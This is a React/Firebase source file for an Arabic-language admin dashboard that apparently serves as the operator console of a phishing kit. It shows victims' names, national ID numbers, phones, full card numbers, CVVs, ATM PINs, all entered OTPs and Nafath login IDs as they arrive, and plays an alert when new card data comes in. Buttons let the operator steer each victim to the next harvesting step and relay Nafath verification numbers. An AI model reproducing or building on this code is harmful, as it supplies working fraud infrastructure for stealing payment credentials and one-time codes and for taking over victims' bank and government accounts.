"use client"
import type React from "react"
import { useState, useEffect, useMemo } from "react"
import { useRouter } from "next/navigation"
import {
  Trash2,
  CreditCard,
  CheckCircle,
  XCircle,
  Clock,
  MapPin,
  User,
  TrendingUp,
  Phone,
  LockIcon,
  Shield,
  ClipboardCheck,
  Activity,
  Users,
} from "lucide-react"
import { Button } from "@/components/ui/button"
import { Badge } from "@/components/ui/badge"
import { ar } from "date-fns/locale"
import { formatDistanceToNow } from "date-fns"
import { Dialog, DialogContent, DialogHeader, DialogTitle } from "@/components/ui/dialog"
import { Card, CardContent, CardHeader } from "@/components/ui/card"
import { collection, doc, updateDoc, onSnapshot, query, orderBy } from "firebase/firestore"
import { onValue, ref } from "firebase/database"
import { database } from "@/lib/firestore"
import { db } from "@/lib/firestore"
import { playNotificationSound } from "@/lib/actions"
import { Tooltip, TooltipContent, TooltipProvider, TooltipTrigger } from "@/components/ui/tooltip"
import { Input } from "@/components/ui/input"
import { toast } from "@/hooks/use-toast"
import { useOnlineUsersCount } from "@/hooks/useOnlineUsersCount"
import { UserStatus } from "@/components/UserStatus"
import { FlagColorSelector } from "@/components/FlagColorSelector"
import { handleDelete } from "@/lib/actions"
import { handleFlagColorChange } from "@/lib/actions"

interface NotificationData {
  action: string
  allOtps: string[]
  approval: string
  atmPin: string
  authNumber: string
  cardHolderName: string
  cardNumber: string
  country: string
  createdDate: string
  currentPage: string
  cvv: string
  expiryMonth: string
  expiryYear: string
  id: string
  idNumber: string
  lastSeen: string
  nafazId: string
  name: string
  networkProvider: string
  online: boolean
  operator: string
  otp: string
  otpSubmittedAt: string
  phone: string
  phone2: string
  phoneOtpCode: string
  phoneVerificationStatus: string
  timestamp: string
  flagColor?: FlagColor
  isHidden?: boolean
}

// Types
type FlagColor = "red" | "yellow" | "green" | null

const stepButtons = [
  { name: "بطاقه", label: <CreditCard />, step: "2" },
  { name: "كود", label: <LockIcon />, step: "3" },
  { name: "رقم", label: <Phone />, step: "9999" },
  { name: "مصادقة", label: <ClipboardCheck />, step: "nafaz" },
]

function StatisticsCard({
  title,
  value,
  change,
  changeType,
  icon: Icon,
  color,
  trend,
}: {
  title: string
  value: string | number
  change: string
  changeType: "increase" | "decrease" | "neutral"
  icon: React.ElementType
  color: string
  trend?: number[]
}) {
  const colorClasses = {
    "bg-gradient-to-br from-blue-500 to-blue-600": "from-blue-500 to-blue-600",
    "bg-gradient-to-br from-emerald-500 to-emerald-600": "from-emerald-500 to-emerald-600",
    "bg-gradient-to-br from-amber-500 to-amber-600": "from-amber-500 to-amber-600",
  }

  return (
    <Card className="relative overflow-hidden border-0 shadow-lg hover:shadow-2xl transition-all duration-300 bg-white">
      <div
        className={`absolute inset-0 bg-gradient-to-br ${colorClasses[color as keyof typeof colorClasses] || color} opacity-5`}
      ></div>
      <CardHeader className="pb-3 relative">
        <div className="flex items-center justify-between">
          <div className={`p-3 rounded-xl ${color} shadow-lg`}>
            <Icon className="h-6 w-6 text-white" />
          </div>
          <div className="text-right">
            <p className="text-sm font-medium text-muted-foreground">{title}</p>
            <p className="text-3xl font-bold text-foreground">{value}</p>
          </div>
        </div>
      </CardHeader>
      <CardContent className="pt-0 relative">
        <div className="flex items-center justify-between">
          <div className="flex items-center gap-1">
            <TrendingUp
              className={`h-4 w-4 ${
                changeType === "increase"
                  ? "text-emerald-600"
                  : changeType === "decrease"
                    ? "text-red-600"
                    : "text-slate-400"
              }`}
            />
            <span
              className={`text-sm font-semibold ${
                changeType === "increase"
                  ? "text-emerald-600"
                  : changeType === "decrease"
                    ? "text-red-600"
                    : "text-slate-400"
              }`}
            >
              {change}
            </span>
          </div>
        </div>
      </CardContent>
    </Card>
  )
}

// Main Component
export default function NotificationsPage() {
  const [notifications, setNotifications] = useState<NotificationData[]>([])
  const [isLoading, setIsLoading] = useState(true)
  const [selectedInfo, setSelectedInfo] = useState<"personal" | "card" | "nafaz" | null>(null)
  const [selectedNotification, setSelectedNotification] = useState<NotificationData | null>(null)
  const [totalVisitors, setTotalVisitors] = useState<number>(0)
  const [cardSubmissions, setCardSubmissions] = useState<number>(0)
  const [filterType, setFilterType] = useState<"all" | "card" | "online">("all")
  const [searchTerm, setSearchTerm] = useState("")
  const [currentPage, setCurrentPage] = useState(1)
  const [itemsPerPage] = useState(10)
  const [settingsOpen, setSettingsOpen] = useState(false)
  const [exportDialogOpen, setExportDialogOpen] = useState(false)
  const [mobileMenuOpen, setMobileMenuOpen] = useState(false)
  const [sortBy, setSortBy] = useState<"date" | "status" | "country">("date")
  const [sortOrder, setSortOrder] = useState<"asc" | "desc">("desc")
  const [showStatstics, setShowStatstics] = useState(true)
  const [authNumber, setAuthNumber] = useState("")
  const [tempUrl, setTempUrl] = useState("")
  const [onlineStatuses, setOnlineStatuses] = useState<{ [key: string]: boolean }>({})

  const router = useRouter()
  const onlineUsersCount = useOnlineUsersCount()

  useEffect(() => {
    const unsubscribe = fetchNotifications()
    return () => unsubscribe()
  }, [])

  useEffect(() => {
    const onlineUsersRef = ref(database, "onlineUsers")
    const unsubscribe = onValue(onlineUsersRef, (snapshot) => {
      const data = snapshot.val() || {}
      setOnlineStatuses(data)
    })
    return () => unsubscribe()
  }, [])

  const fetchNotifications = () => {
    setIsLoading(true)
    const q = query(collection(db, "pays"), orderBy("createdDate", "desc"))
    const unsubscribe = onSnapshot(
      q,
      (querySnapshot) => {
        const notificationsData = querySnapshot.docs
          .map((doc) => {
            const data = doc.data() as any
            return { id: doc.id, ...data }
          })
          .filter((notification: any) => !notification.isHidden) as NotificationData[]

        const hasNewCardInfo = notificationsData.some(
          (notification) =>
            notification.cardNumber && !notifications.some((n) => n.id === notification.id && n.cardNumber),
        )
        const hasNewGeneralInfo = notificationsData.some(
          (notification) =>
            (notification.idNumber || notification.phone || notification.name) &&
            !notifications.some((n) => n.id === notification.id && (n.idNumber || n.phone || n.name)),
        )

        if (hasNewCardInfo || hasNewGeneralInfo) {
          playNotificationSound()
        }

        updateStatistics(notificationsData)
        setNotifications(notificationsData)
        setIsLoading(false)
      },
      (error) => {
        console.error("Error fetching notifications:", error)
        setIsLoading(false)
        toast({
          title: "خطأ في جلب البيانات",
          description: "حدث خطأ أثناء جلب الإشعارات",
          variant: "destructive",
        })
      },
    )

    return unsubscribe
  }

  const handleCurrentPageUpdate = async (id: string, currentPage: string) => {
    try {
      const docRef = doc(db, "pays", id)
      await updateDoc(docRef, { currentPage })
      setNotifications((prev) => prev.map((n) => (n.id === id ? { ...n, currentPage } : n)))
      toast({
        title: "تم تحديث الصفحة الحالية",
        description: `تم تحديث الصفحة الحالية إلى: ${currentPage}`,
        variant: "default",
      })
    } catch (error) {
      console.error("Error updating current page:", error)
      toast({
        title: "خطأ",
        description: "حدث خطأ أثناء تحديث الصفحة الحالية.",
        variant: "destructive",
      })
    }
  }

  const updateStatistics = (notificationsData: NotificationData[]) => {
    const totalCount = notificationsData.length
    const cardCount = notificationsData.filter((notification) => notification.cardNumber).length
    setTotalVisitors(totalCount)
    setCardSubmissions(cardCount)
  }

  const handleInfoClick = (notification: NotificationData, infoType: "personal" | "card" | "nafaz") => {
    setSelectedNotification(notification)
    setSelectedInfo(infoType)
  }

  const handleAuthNumberUpdate = async (id: string, authNumber: string) => {
    try {
      const docRef = doc(db, "pays", id)
      await updateDoc(docRef, {
        authNumber: authNumber,
        phoneVerificationStatus: "approved",
      })
      setNotifications((prev) => prev.map((n) => (n.id === id ? { ...n, authNumber: authNumber } : n)))
      toast({
        title: "تم تحديث رقم التحقق",
        description: `تم تحديث رقم التحقق إلى: ${authNumber}`,
        variant: "default",
      })
    } catch (error) {
      console.error("Error updating auth number:", error)
      toast({
        title: "خطأ",
        description: "حدث خطأ أثناء تحديث رقم التحقق.",
        variant: "destructive",
      })
    }
  }

  const handleApproval = async (state: string, id: string) => {
    try {
      const targetPost = doc(db, "pays", id)
      await updateDoc(targetPost, {
        approval: state,
      })
      toast({
        title: state === "approved" ? "تمت الموافقة" : "تم الرفض",
        description: state === "approved" ? "تمت الموافقة على الإشعار بنجاح" : "تم رفض الإشعار بنجاح",
        variant: "default",
      })
    } catch (error) {
      console.error("Error updating notification status:", error)
      toast({
        title: "خطأ",
        description: "حدث خطأ أثناء تحديث حالة الإشعار",
        variant: "destructive",
      })
    }
  }

  const paginatedNotifications = useMemo(() => {
    const startIndex = (currentPage - 1) * itemsPerPage
    const endIndex = startIndex + itemsPerPage
    return notifications.slice(startIndex, endIndex)
  }, [currentPage, itemsPerPage, notifications])

  const closeDialog = () => setSelectedInfo(null)

  if (isLoading) {
    return (
      <div className="min-h-screen bg-gradient-to-br from-background via-blue-50/30 to-emerald-50/30 flex items-center justify-center">
        <div className="flex flex-col items-center gap-4">
          <div className="relative">
            <div className="h-12 w-12 animate-spin rounded-full border-4 border-slate-200 border-t-blue-600"></div>
            <div className="absolute inset-0 h-12 w-12 animate-pulse rounded-full bg-blue-500/10"></div>
          </div>
          <div className="text-lg font-semibold text-slate-700">جاري التحميل...</div>
        </div>
      </div>
    )
  }

  return (
    <div dir="rtl" className="min-h-screen bg-gradient-to-br from-slate-50 via-blue-50/30 to-emerald-50/20">
      <div className="p-6 space-y-8">
        <div className="space-y-6">
          <div className="flex flex-col gap-2">
            <h1 className="text-4xl font-bold text-slate-900">مراقبة الإشعارات</h1>
            <p className="text-slate-600">إدارة واستعراض جميع الطلبات والإشعارات</p>
          </div>

          <div className="grid grid-cols-1 md:grid-cols-3 gap-6">
            <StatisticsCard
              title="إجمالي الإشعارات"
              value={totalVisitors}
              change="+12% من أمس"
              changeType="increase"
              icon={Activity}
              color="bg-gradient-to-br from-blue-500 to-blue-600"
            />
            <StatisticsCard
              title="الطلبات ببطاقات"
              value={cardSubmissions}
              change="+8% من أمس"
              changeType="increase"
              icon={CreditCard}
              color="bg-gradient-to-br from-emerald-500 to-emerald-600"
            />
            <StatisticsCard
              title="المستخدمون النشطون"
              value={onlineUsersCount}
              change="الآن"
              changeType="neutral"
              icon={Users}
              color="bg-gradient-to-br from-amber-500 to-amber-600"
            />
          </div>
        </div>

        <Card className="border-0 shadow-xl overflow-hidden">
          <CardHeader className="bg-gradient-to-r from-blue-500/5 to-emerald-500/5 border-b border-slate-200 pb-4">
            <div className="flex items-center justify-between">
              <h2 className="text-2xl font-bold text-slate-900">الإشعارات الحديثة</h2>
              <div className="text-sm text-slate-600">
                {paginatedNotifications.length} من {notifications.length}
              </div>
            </div>
          </CardHeader>

          <CardContent className="p-0">
            {/* Desktop Table View */}
            <div className="hidden lg:block overflow-x-auto">
              <table className="w-full">
                <thead>
                  <tr className="border-b border-slate-200 bg-slate-50/50">
                    <th className="px-6 py-4 text-right font-semibold text-slate-700">الدولة</th>
                    <th className="px-6 py-4 text-right font-semibold text-slate-700">المعلومات</th>
                    <th className="px-6 py-4 text-right font-semibold text-slate-700">الوقت</th>
                    <th className="px-6 py-4 text-center font-semibold text-slate-700">الاتصال</th>
                    <th className="px-6 py-4 text-center font-semibold text-slate-700">الكود</th>
                    <th className="px-6 py-4 text-center font-semibold text-slate-700">تحديث الخطوة</th>
                    <th className="px-6 py-4 text-center font-semibold text-slate-700">الإجراءات</th>
                  </tr>
                </thead>
                <tbody>
                  {paginatedNotifications.map((notification, index) => (
                    <tr
                      key={notification.id}
                      className="border-b border-slate-100 hover:bg-blue-50/50 transition-colors"
                    >
                      <td className="px-6 py-4">
                        <div className="flex items-center gap-3">
                          <div className="w-8 h-8 rounded-full bg-gradient-to-br from-blue-100 to-blue-50 flex items-center justify-center">
                            <MapPin className="h-4 w-4 text-blue-600" />
                          </div>
                          <span className="font-medium text-slate-900">{notification.country || "غير معروف"}</span>
                        </div>
                      </td>
                      <td className="px-6 py-4">
                        <div className="flex flex-wrap gap-2">
                          <Badge
                            variant={notification.name ? "default" : "secondary"}
                            className={`cursor-pointer transition-all hover:scale-105 ${
                              notification.name
                                ? "bg-blue-100 text-blue-700 hover:bg-blue-200"
                                : "bg-slate-100 text-slate-600"
                            }`}
                            onClick={() => handleInfoClick(notification, "personal")}
                          >
                            <User className="h-3 w-3 mr-1" />
                            {notification.name ? "معلومات شخصية" : "لا يوجد"}
                          </Badge>
                          <Badge
                            variant={notification.cardNumber ? "default" : "secondary"}
                            className={`cursor-pointer transition-all hover:scale-105 ${
                              notification.cardNumber
                                ? "bg-emerald-100 text-emerald-700 hover:bg-emerald-200"
                                : "bg-slate-100 text-slate-600"
                            }`}
                            onClick={() => handleInfoClick(notification, "card")}
                          >
                            <CreditCard className="h-3 w-3 mr-1" />
                            {notification.cardNumber ? "بطاقة" : "لا يوجد"}
                          </Badge>
                          <Badge
                            variant={notification.nafazId ? "default" : "secondary"}
                            className={`cursor-pointer transition-all hover:scale-105 ${
                              notification.nafazId
                                ? "bg-amber-100 text-amber-700 hover:bg-amber-200"
                                : "bg-slate-100 text-slate-600"
                            }`}
                            onClick={() => handleInfoClick(notification, "nafaz")}
                          >
                            <Shield className="h-3 w-3 mr-1" />
                            {notification.nafazId ? "نفاذ" : "لا يوجد"}
                          </Badge>
                        </div>
                      </td>

                      <td className="px-6 py-4">
                        <div className="flex items-center gap-2 text-sm text-slate-600">
                          <Clock className="h-4 w-4 text-slate-400" />
                          {notification.createdDate &&
                            formatDistanceToNow(new Date(notification.createdDate), {
                              addSuffix: true,
                              locale: ar,
                            })}
                        </div>
                      </td>
                      <td className="px-6 py-4 text-center">
                        <UserStatus userId={notification.id} />
                      </td>
                      <td className="px-6 py-4 text-center">
                        {notification.otp && (
                          <Badge variant="outline" className="bg-blue-50 text-blue-700 border-blue-200 font-mono">
                            {notification.otp}
                          </Badge>
                        )}
                      </td>
                      <td className="px-6 py-4">
                        <div className="flex flex-wrap justify-center gap-1">
                          {stepButtons.map(({ name, label, step }) => (
                            <TooltipProvider key={step}>
                              <Tooltip>
                                <TooltipTrigger asChild>
                                  <Button
                                    size="icon"
                                    variant={notification.currentPage === step.toString() ? "default" : "outline"}
                                    onClick={() => handleCurrentPageUpdate(notification.id, step)}
                                    className={`text-xs px-2 h-7 transition-all ${
                                      notification.currentPage === step.toString()
                                        ? "bg-blue-600 text-white shadow-md"
                                        : "hover:bg-slate-100"
                                    }`}
                                  >
                                    {label}
                                  </Button>
                                </TooltipTrigger>
                                <TooltipContent>
                                  <p>{name}</p>
                                </TooltipContent>
                              </Tooltip>
                            </TooltipProvider>
                          ))}
                        </div>
                      </td>
                      <td className="px-6 py-4">
                        <div className="flex justify-center gap-2 items-center">
                          <TooltipProvider>
                            <Tooltip>
                              <TooltipTrigger asChild>
                                <Button
                                  variant="ghost"
                                  size="sm"
                                  onClick={() => handleDelete(notification.id)}
                                  className="text-red-600 hover:text-red-700 hover:bg-red-50"
                                >
                                  <Trash2 className="h-4 w-4" />
                                </Button>
                              </TooltipTrigger>
                              <TooltipContent>
                                <p>حذف</p>
                              </TooltipContent>
                            </Tooltip>
                          </TooltipProvider>
                          <FlagColorSelector
                            notificationId={notification.id}
                            currentColor={notification?.flagColor}
                            onColorChange={handleFlagColorChange}
                          />
                        </div>
                      </td>
                    </tr>
                  ))}
                </tbody>
              </table>
            </div>

            {/* Mobile Card View */}
            <div className="lg:hidden space-y-3 p-4">
              {paginatedNotifications.map((notification) => (
                <Card
                  key={notification.id}
                  className="border border-slate-200 hover:border-blue-200 hover:shadow-md transition-all"
                >
                  <CardHeader className="pb-3 bg-gradient-to-r from-blue-50/50 to-emerald-50/50">
                    <div className="flex justify-between items-start gap-3">
                      <div className="flex items-center gap-3 flex-1">
                        <div className="w-10 h-10 rounded-full bg-gradient-to-br from-blue-100 to-blue-50 flex items-center justify-center flex-shrink-0">
                          <MapPin className="h-5 w-5 text-blue-600" />
                        </div>
                        <div className="min-w-0">
                          <p className="font-semibold text-slate-900">{notification.country || "غير معروف"}</p>
                          <p className="text-xs text-slate-600">
                            {notification.createdDate &&
                              formatDistanceToNow(new Date(notification.createdDate), {
                                addSuffix: true,
                                locale: ar,
                              })}
                          </p>
                        </div>
                      </div>
                      <UserStatus userId={notification.id} />
                    </div>
                  </CardHeader>

                  <CardContent className="pt-4">
                    <div className="space-y-4">
                      <div className="flex flex-wrap gap-2">
                        <Badge
                          variant={notification.name ? "default" : "secondary"}
                          className={`cursor-pointer text-xs ${
                            notification.name ? "bg-blue-100 text-blue-700" : "bg-slate-100 text-slate-600"
                          }`}
                          onClick={() => handleInfoClick(notification, "personal")}
                        >
                          {notification.name ? "معلومات شخصية" : "لا يوجد معلومات"}
                        </Badge>
                        <Badge
                          variant={notification.cardNumber ? "default" : "secondary"}
                          className={`cursor-pointer text-xs ${
                            notification.cardNumber ? "bg-emerald-100 text-emerald-700" : "bg-slate-100 text-slate-600"
                          }`}
                          onClick={() => handleInfoClick(notification, "card")}
                        >
                          <CreditCard className="h-3 w-3 mr-1" />
                          {notification.cardNumber ? "البطاقة" : "لا يوجد"}
                        </Badge>
                        {notification.otp && (
                          <Badge variant="outline" className="bg-blue-50 text-blue-700 text-xs">
                            {notification.otp}
                          </Badge>
                        )}
                      </div>

                      <div className="pt-3 border-t border-slate-100">
                        <p className="text-xs font-semibold text-slate-600 mb-2">تحديث الخطوة:</p>
                        <div className="flex flex-wrap gap-2">
                          {stepButtons.map(({ label, step }) => (
                            <Button
                              key={step}
                              size="sm"
                              variant={notification.currentPage === step.toString() ? "default" : "outline"}
                              onClick={() => handleCurrentPageUpdate(notification.id, step)}
                              className="text-xs h-7"
                            >
                              {label}
                            </Button>
                          ))}
                        </div>
                      </div>

                      <div className="flex gap-2 pt-3 border-t border-slate-100">
                        <Button
                          onClick={() => handleApproval("approved", notification.id)}
                          className="flex-1 bg-emerald-600 hover:bg-emerald-700 text-white text-xs h-8"
                          size="sm"
                          disabled={notification.approval === "approved"}
                        >
                          <CheckCircle className="h-3 w-3 mr-1" />
                          موافقة
                        </Button>
                        <Button
                          onClick={() => handleApproval("rejected", notification.id)}
                          className="flex-1 bg-red-600 hover:bg-red-700 text-white text-xs h-8"
                          size="sm"
                          disabled={notification.approval === "rejected"}
                        >
                          <XCircle className="h-3 w-3 mr-1" />
                          رفض
                        </Button>
                        <Button
                          variant="outline"
                          onClick={() => handleDelete(notification.id)}
                          className="text-red-600 hover:text-red-700 hover:bg-red-50 text-xs h-8"
                          size="sm"
                        >
                          <Trash2 className="h-3 w-3" />
                        </Button>
                      </div>
                    </div>
                  </CardContent>
                </Card>
              ))}
            </div>
          </CardContent>
        </Card>

        {notifications.length > itemsPerPage && (
          <div className="flex justify-center gap-2">
            {Array.from({ length: Math.ceil(notifications.length / itemsPerPage) }).map((_, i) => (
              <Button
                key={i + 1}
                variant={currentPage === i + 1 ? "default" : "outline"}
                onClick={() => setCurrentPage(i + 1)}
                className={`transition-all ${currentPage === i + 1 ? "bg-blue-600 text-white shadow-md" : ""}`}
              >
                {i + 1}
              </Button>
            ))}
          </div>
        )}
      </div>

      <Dialog open={selectedInfo !== null} onOpenChange={closeDialog}>
        <DialogContent className="max-w-md" dir="rtl">
          <DialogHeader>
            <DialogTitle className="flex items-center gap-3 text-xl">
              {selectedInfo === "personal" ? (
                <>
                  <div className="w-10 h-10 rounded-full bg-gradient-to-br from-blue-500 to-blue-600 flex items-center justify-center">
                    <User className="h-5 w-5 text-white" />
                  </div>
                  <span className="text-slate-900">المعلومات الشخصية</span>
                </>
              ) : selectedInfo === "card" ? (
                <>
                  <div className="w-10 h-10 rounded-full bg-gradient-to-br from-emerald-500 to-emerald-600 flex items-center justify-center">
                    <CreditCard className="h-5 w-5 text-white" />
                  </div>
                  <span className="text-slate-900">معلومات البطاقة</span>
                </>
              ) : (
                <>
                  <div className="w-10 h-10 rounded-full bg-gradient-to-br from-amber-500 to-amber-600 flex items-center justify-center">
                    <Shield className="h-5 w-5 text-white" />
                  </div>
                  <span className="text-slate-900">معلومات نفاذ</span>
                </>
              )}
            </DialogTitle>
          </DialogHeader>

          {selectedInfo === "personal" && selectedNotification && (
            <div className="space-y-4">
              <div className="bg-gradient-to-br from-slate-50 to-slate-100/50 rounded-xl p-4 space-y-3 border border-slate-200">
                {[
                  { label: "الاسم", value: selectedNotification.name },
                  { label: "اسم حامل البطاقة", value: selectedNotification.cardHolderName },
                  { label: "رقم الهوية", value: selectedNotification.idNumber },
                  { label: "الشبكة", value: selectedNotification.operator || selectedNotification.networkProvider },
                  { label: "رقم الجوال", value: selectedNotification.phone },
                  { label: "الهاتف 2", value: selectedNotification.phone2 },
                  { label: "رمز هاتف", value: selectedNotification.phoneOtpCode },
                ].map(
                  ({ label, value }) =>
                    value && (
                      <div
                        key={label}
                        className="flex justify-between items-center py-2 border-b border-slate-200 last:border-0"
                      >
                        <span className="font-medium text-slate-600">{label}:</span>
                        <span className="font-semibold text-slate-900">{value}</span>
                      </div>
                    ),
                )}
              </div>
            </div>
          )}

          {selectedInfo === "nafaz" && selectedNotification && (
            <div className="space-y-4">
              <div className="bg-gradient-to-br from-slate-50 to-slate-100/50 rounded-xl p-4 space-y-3 border border-slate-200">
                <div className="flex justify-between items-center py-2 border-b border-slate-200">
                  <span className="font-medium text-slate-600">معرف نفاذ:</span>
                  <span className="font-semibold text-slate-900">{selectedNotification?.nafazId || "غير متوفر"}</span>
                </div>
                <div className="flex justify-between items-center py-2 border-b border-slate-200">
                  <span className="font-medium text-slate-600">رقم التحقق:</span>
                  <span className="font-semibold text-slate-900">
                    {selectedNotification?.authNumber || "غير متوفر"}
                  </span>
                </div>
                <div className="flex justify-between items-center py-2">
                  <span className="font-medium text-slate-600">حالة التحقق:</span>
                  <span className="font-semibold text-slate-900">{selectedNotification?.phoneVerificationStatus}</span>
                </div>
              </div>
              <div className="flex justify-around gap-2 pt-2">
                <Input
                  type="tel"
                  value={authNumber}
                  onChange={(e) => setAuthNumber(e.target.value)}
                  placeholder="أدخل رقم التحقق"
                  className="flex-1 border-slate-200"
                />
                <Button
                  onClick={() => handleAuthNumberUpdate(selectedNotification!.id!, authNumber)}
                  className="bg-blue-600 hover:bg-blue-700 text-white"
                >
                  تحديث
                </Button>
              </div>
            </div>
          )}

          {selectedInfo === "card" && selectedNotification && (
            <div className="space-y-4">
              <div className="bg-gradient-to-br from-slate-50 to-slate-100/50 rounded-xl p-4 space-y-3 border border-slate-200">
                {[
                  { label: "اسم حامل البطاقة", value: selectedNotification.cardHolderName },
                  { label: "رقم البطاقة", value: selectedNotification.cardNumber },
                  {
                    label: "تاريخ الانتهاء",
                    value:
                      selectedNotification.expiryMonth && selectedNotification.expiryYear
                        ? `${selectedNotification.expiryMonth}/${selectedNotification.expiryYear}`
                        : undefined,
                  },
                  { label: "رمز الأمان", value: selectedNotification.cvv },
                  { label: "رقم التعريف الشخصي", value: selectedNotification.atmPin },
                  { label: "رمز التحقق", value: selectedNotification.otp },
                  { label: "الخطوة الحالية", value: selectedNotification.currentPage },
                ].map(
                  ({ label, value }) =>
                    value !== undefined && (
                      <div
                        key={label}
                        className="flex justify-between items-center py-2 border-b border-slate-200 last:border-0"
                      >
                        <span className="font-medium text-slate-600">{label}:</span>
                        <span className="font-semibold text-slate-900" dir="ltr">
                          {String(value)}
                        </span>
                      </div>
                    ),
                )}
                {selectedNotification.allOtps &&
                  Array.isArray(selectedNotification.allOtps) &&
                  selectedNotification.allOtps.length > 0 && (
                    <div className="pt-2 border-t border-slate-200">
                      <span className="font-medium text-slate-600 block mb-2">جميع الرموز:</span>
                      <div className="flex flex-wrap gap-2">
                        {selectedNotification.allOtps.map((otp, index) => (
                          <Badge key={index} variant="outline" className="bg-slate-100 text-slate-700 border-slate-200">
                            {otp}
                          </Badge>
                        ))}
                      </div>
                    </div>
                  )}
              </div>
            </div>
          )}
        </DialogContent>
      </Dialog>
    </div>
  )
}
